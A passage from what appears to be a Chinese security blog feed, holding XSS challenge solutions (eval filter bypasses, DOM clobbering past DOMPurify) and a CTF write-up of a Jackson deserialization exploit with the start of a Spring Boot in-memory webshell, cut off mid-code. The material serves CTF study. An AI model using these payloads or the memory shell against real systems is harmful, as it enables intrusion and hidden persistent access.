punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Mafia"><a href="#Mafia" class="headerlink" title="Mafia"></a>Mafia</h5><pre class="line-numbers language-html"><code class="language-html">mafia = (new URL(location).searchParams.get('mafia') || '1+1')mafia = mafia.slice(0, 50)mafia = mafia.replace(/[\`\'\"\+\-\!\\\[\]]/gi, '_')mafia = mafia.replace(/alert/g, '_')eval(mafia)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤<code>alert</code>，又因为过滤了<code>&quot; &#39; </code>等表示字符串的标识，感觉没法用<code>atob</code>这种编解码绕？用<code>prompt</code>倒是可以但是要求用<code>alert</code>。</p><p>照抄答案好了。</p><p>绕过方法:</p><ol><li>定义匿名函数，利用匿名函数的参数构造payload，同时使用正则表达式来绕过alert字符串的检测。</li><li>利用数字和字符串之间的互相转换，来绕过针对alert的检测。</li><li>在URL地址后面加上#${payload}，然后通过location.hash.slice(1)来获取payload，也能做到绕过检测。</li></ol><p>构造payload：</p><pre><code>// 匿名函数?mafia=Function(/ALERT(1337)/.source.toLowerCase())()// 数字转字符串，将30进制的数字8680439转换成字符串，就是alert?mafia=eval(8680439..toString(30))(1337)// 在URL后面加上 #alert(1337)?mafia=eval(location.hash.slice(1))#alert(1337)</code></pre><p>第三个解法有点意思。通过<code>location.hash</code>获取<code>#</code>后的字符，但是<code>html</code>是不会取<code>#</code>后面作为参数的，因此这样也能绕过检测。</p><h5 id="Ok-Boomer（DOM破坏）"><a href="#Ok-Boomer（DOM破坏）" class="headerlink" title="Ok, Boomer（DOM破坏）"></a>Ok, Boomer（DOM破坏）</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>boomer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Ok, Boomer.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    boomer<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'boomer'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"Ok, Boomer"</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>ok<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>终于到<code>dom</code>破坏了。</p><p>用前面的<code>area</code>标签<code>toString</code>的特性即可赋值<code>ok</code>，因为<code>setTimeout</code>会自动执行<code>toString</code>方法。很容易就能构造出这样的形式。</p><pre><code>&lt;area id=ok href=&quot;javascript:alert(1337)&quot;&gt;</code></pre><p>这里需要注意的是<code>href</code>的值要遵守<code>protocol:uri</code>的格式，不遵守的话就成这样了：</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701598173523.png" alt="1701598173523" width="5%" height="5%" /><p>然而这样是不行的，因为这里经过了<code>DOMPurify.sanitize</code>过滤。我们可以看<code>DOM purify</code>的源码(<a href="https://github.com/cure53/DOMPurify/blob/main/src/regexp.js)%E3%80%82">https://github.com/cure53/DOMPurify/blob/main/src/regexp.js)。</a></p><p>这里设定了白名单协议。</p><pre><code>export const IS_ALLOWED_URI = seal(  /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i // eslint-disable-line no-useless-escape);</code></pre><p>可以用到的协议。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701598575781.png" alt="1701598575781" width="5%" height="5%" /><p>这里试了几个，这些是能打通的。</p><pre><code>&lt;area id=ok href=&quot;xmpp:alert(1)&quot;&gt;&lt;area id=ok href=&quot;cid:alert(1)&quot;&gt;&lt;area id=ok href=&quot;mailto:alert(1)&quot;&gt;&lt;area id=ok href=&quot;callto:alert(1)&quot;&gt;&lt;area id=ok href=&quot;tel:alert(1)&quot;&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> 日常学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>香山杯决赛Secure System复现</title>
      <link href="/2023/11/22/secure-system/"/>
      <url>/2023/11/22/secure-system/</url>
      
        <content type="html"><![CDATA[<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p><code>META-INF</code>看<code>pom.xml</code>，存在<code>Springboot 2.7.12</code>，<code>JackSon</code>依赖。</p><p><code>BOOT-INF</code>看源码。</p><p>只有一个<code>/safeobject</code>路由。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/safeobject"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">start</span><span class="token punctuation">(</span>String obj<span class="token punctuation">,</span> String classes<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>classes<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>classes<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"LinkedHashMap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Class <span class="token class-name">c</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classes<span class="token punctuation">)</span><span class="token punctuation">;</span>            SecurityCheck var10000 <span class="token operator">=</span> isSafe<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>SecurityCheck<span class="token punctuation">.</span><span class="token function">isSafe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Object o <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">deObject</span><span class="token punctuation">(</span>mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> o<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                StringBuilder sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                var10000 <span class="token operator">=</span> isSafe<span class="token punctuation">;</span>                Iterator var5 <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">ismap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    Object item <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>                    sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>SecurityCheck<span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传进来的<code>classes</code>必须不包含<code>LinkedHashMap</code>以及<code>Object</code>才会走到<code>if</code>里，之后加载<code>classes</code>类。</p><p>由于<code>SecurityCheck</code>的<code>safe</code>变量默认为<code>true</code>，所以默认走第一个<code>if</code>。</p><p>想法是第一个<code>if</code>中直接打个<code>POJONODE</code>，之后<code>o.toString</code>调用<code>POJONODE#toString</code>方法触发<code>RCE</code>.</p><pre><code>POJONODE#toString  //后反序列化触发com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code></pre><p><code>ObjectMapper#readValue</code>方法是用来恢复对象用的，第二个参数是指定的类名，第一个是要反序列化成的对象。</p><p>而这题的一个难点可能就是需要读懂<code>deObject</code>方法。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValues</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> String fieldName<span class="token punctuation">,</span> Object fieldValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> fieldName<span class="token punctuation">,</span> <span class="token function">deObject</span><span class="token punctuation">(</span>fieldValue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">deObject</span><span class="token punctuation">(</span>Object ob<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ob <span class="token keyword">instanceof</span> <span class="token class-name">LinkedHashMap</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        LinkedHashMap map <span class="token operator">=</span> <span class="token punctuation">(</span>LinkedHashMap<span class="token punctuation">)</span>ob<span class="token punctuation">;</span>        String type <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"@type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> type <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>            Object obj <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Iterator ir <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>ir<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                String key <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ir<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Object value <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"@type"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    Field field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>field <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token function">setFieldValues</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> obj<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> map<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> ob<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里<code>instanceof</code>用<code>LinkedHashMap</code>的子类绕过就行，随便找一个<code>org.springframework.core.annotation.AnnotationAttributes</code>。</p><p><code>deObject</code>是一个恢复类属性的方法，并且<code>setFieldValue</code>那里会循环调用<code>deObject</code>。这是为了处理属性是一个类的情况，比如说在进行<code>jackson</code>攻击的时候，<code>POJONODE</code>的<code>_value</code>很明显是个<code>TemplatesImpl</code>，如果不这么递归处理那么不可能给<code>_value</code>赋值一个<code>object</code>。</p><p>于是搓出来这样一个<code>payload</code>，<code>_bytecodes</code>这里是个字节数组：</p><pre><code>classes：org.springframework.core.annotation.AnnotationAttributesobj：&#123;&quot;@type&quot;:&quot;com.fasterxml.jackson.databind.node.POJONode&quot;,&quot;_value&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;123&quot;,&quot;123123&quot;,...],&quot;_name&quot;:&quot;squirt1e&quot;,&quot;_tfactory&quot;:&#123;&#125;,&quot;_outputProperties&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;&#125;,&quot;_name&quot;:&quot;a&quot;&#125;&#125;</code></pre><p>但是这里实际是打不通的。因为<code>POJONODE</code>只有一个带参数的构造方法，但是题目反射实例化类这里调用的是无参反射，到下面代码那一行直接报错了。</p><pre><code>Object obj = clazz.newInstance();</code></pre><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>真正的利用点在<code>else</code>分支的反序列化方法中，因为存在<code>Jackson</code>依赖，可以打个<code>Jackson</code>全版本通杀链子。</p><pre class="line-numbers language-java"><code class="language-java">StringBuilder sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10000 <span class="token operator">=</span> isSafe<span class="token punctuation">;</span>Iterator var5 <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">ismap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Object item <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>    sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>SecurityCheck<span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//exploit</span><span class="token punctuation">}</span><span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先我们要设置<code>SecurityCheck</code>类的<code>safe</code>为<code>false</code>，这样才能走到<code>else</code>那里。</p><pre><code>&#123;&quot;@type&quot;:&quot;ctf.nese.SecurityCheck&quot;,&quot;safe&quot;:false&#125;</code></pre><p>憨批了，这里只设置<code>safe</code>还不行，我们还要把<code>payload</code>传进去这样第二遍才能加载<code>payload</code>。这里还有个小问题，就是给<code>treeMap</code>赋值是有些说法的。<code>treeMap</code>是个<code>hashSet</code>类型，我们通过<code>deObject</code>方法怎么给他赋值呢？我感觉这个题难点就在这里。线下不好上网很有可能不知道怎么赋值。</p><p>看<code>HashSet</code>的构造函数，其实就是实例化一个<code>HashMap</code>。因此不难推断出<code>HashSet</code>就是基于<code>HashMap</code>实现的，准确来说是阉割版。</p><pre><code>    public HashSet() &#123;        map = new HashMap&lt;&gt;();    &#125;</code></pre><p>而他的<code>add</code>方法就是往<code>HashMap</code>里塞进去一个键值对，<code>HashMap</code>的键就是<code>HashSet</code>的值，而后面的<code>PRESENT</code>只起一个占位作用。这么做的原因是<code>HashMap</code>本身就不允许重复键，正好被<code>HashSet</code>拿来用。</p><pre><code>    private static final Object PRESENT = new Object();    public boolean add(E e) &#123;        return map.put(e, PRESENT)==null;    &#125;</code></pre><p>所以直接给<code>map</code>的<code>key</code>赋值反序列化数据就可以了。</p><pre><code>&#123;&quot;@type&quot;:&quot;ctf.nese.SecurityCheck&quot;,&quot;safe&quot;:false,&quot;treeMap&quot;:&#123;&quot;@type&quot;:&quot;java.util.HashSet&quot;,&quot;map&quot;:&#123;&quot;反序列化字符串&quot;:&quot;&quot;&#125;&#125;&#125;</code></pre><p>注意<code>base64</code>有一些脏字符，<code>url</code>编码即可。</p><h4 id="内存马攻击"><a href="#内存马攻击" class="headerlink" title="内存马攻击"></a>内存马攻击</h4><p>环境不出网，<code>Springboot</code>依赖注入内存马即可。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> gadget<span class="token punctuation">.</span>memshell<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>WebApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span>RequestContextHolder<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span>ServletRequestAttributes<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span>PatternsRequestCondition<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span>RequestMethodsRequestCondition<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>RequestMappingInfo<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RequestMappingHandlerMapping<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringBootMemoryShellOfController</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Integer i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">SpringBootMemoryShellOfController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 1. 利用spring内部方法获取context</span>        WebApplicationContext context <span class="token operator">=</span> <span class="token punctuation">(</span>WebApplicationContext<span class="token punctuation">)</span> RequestContextHolder<span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2. 从context中获得 RequestMappingHandlerMapping 的实例</span>        RequestMappingHandlerMapping mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>RequestMappingHandlerMapping<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field configField <span class="token operator">=</span> mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        configField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration config <span class="token operator">=</span> <span class="token punctuation">(</span>RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration<span class="token punctuation">)</span> configField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3. 通过反射获得自定义 controller 中的 Method 对象</span>        Method method <span class="token operator">=</span> SpringBootMemoryShellOfController<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span>HttpServletRequest<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> HttpServletResponse<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 在内存中动态注册 controller</span>        RequestMappingInfo info <span class="token operator">=</span> RequestMappingInfo<span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token string">"/test2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            SpringBootMemoryShellOfController springBootMemoryShellOfController <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpringBootMemoryShellOfController</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> springBootMemoryShellOfController<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token 